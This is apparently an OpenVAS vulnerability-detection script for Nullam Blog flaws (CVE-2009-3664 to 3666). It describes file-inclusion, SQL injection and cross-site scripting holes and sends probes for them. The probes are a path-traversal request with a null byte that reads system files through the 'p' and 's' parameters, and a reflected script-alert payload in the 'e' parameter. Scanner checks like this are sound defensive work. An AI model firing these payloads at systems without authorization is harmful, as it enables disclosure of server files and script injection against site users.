###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_nullam_blog_mult_vuln.nasl 13543 2019-02-08 14:43:51Z cfischer $
#
# Nullam Blog Multiple Vulnerabilities
#
# Authors:
# Sharath S <sharaths@secpod.com>
#
# Copyright:
# Copyright (c) 2009 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900888");
  script_version("$Revision: 13543 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2009-10-31 09:54:01 +0100 (Sat, 31 Oct 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-3664", "CVE-2009-3665", "CVE-2009-3666");
  script_name("Nullam Blog Multiple Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://secunia.com/advisories/36648");
  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/9625");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/53217");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to disclose sensitive information
  and conduct cross-site scripting and SQL injection attacks.");

  script_tag(name:"affected", value:"Nullam Blog version prior to 0.1.3 on Linux.");

  script_tag(name:"insight", value:"- Input passed to the 'p' and 's' parameter in index.php is not properly
  verified before being used to include files. This can be exploited to include arbitrary files from local resources.

  - Input passed to the 'i' and 'v' parameter in index.php is not properly sanitised before being used in SQL queries.
  This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.

  - Input passed to the 'e' parameter in index.php is not properly sanitised before being returned to the user.
  This can be exploited to execute arbitrary HTML and script code in a user's browser session in the context
  of an affected site.");

  script_tag(name:"solution", value:"Upgrade to Nullam Blog version 0.1.3 or later.");

  script_tag(name:"summary", value:"This host is running Nullam Blog and is prone to multiple
  vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("host_details.inc");
include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );

if( ! can_host_php( port:port ) ) exit( 0 );

files = traversal_files();

foreach dir( make_list_unique("/", "/nullam", "/blog", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  rcvRes1 = http_get_cache( item: dir + "/index.php", port:port );

  if( rcvRes1 =~ "^HTTP/1\.[01] 200" && "<title>Nullam</title>" >< rcvRes1 ) {

    foreach file( keys( files ) ) {

      foreach item( make_list( "s", "p" ) ) {

        url = dir + "/index.php?" + item + "=../../../../../../" + files[file] + "%00";

        if( http_vuln_check( port:port, url:url, pattern:file ) ) {
          report = report_vuln_url( port:port, url:url );
          security_message( port:port, data:report );
          exit( 0 );
        }
      }
    }

    url = dir + "/index.php?p=error&e=<script>alert" + "('VT-SQL-Injection-Test');</script>";
    sndReq2 = http_get( item:url, port:port );
    rcvRes2 = http_keepalive_send_recv( port:port, data:sndReq2 );

    if( rcvRes2 =~ "^HTTP/1\.[01] 200" && "<script>alert('VT-SQL-Injection-Test');</script>" >< rcvRes2 ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );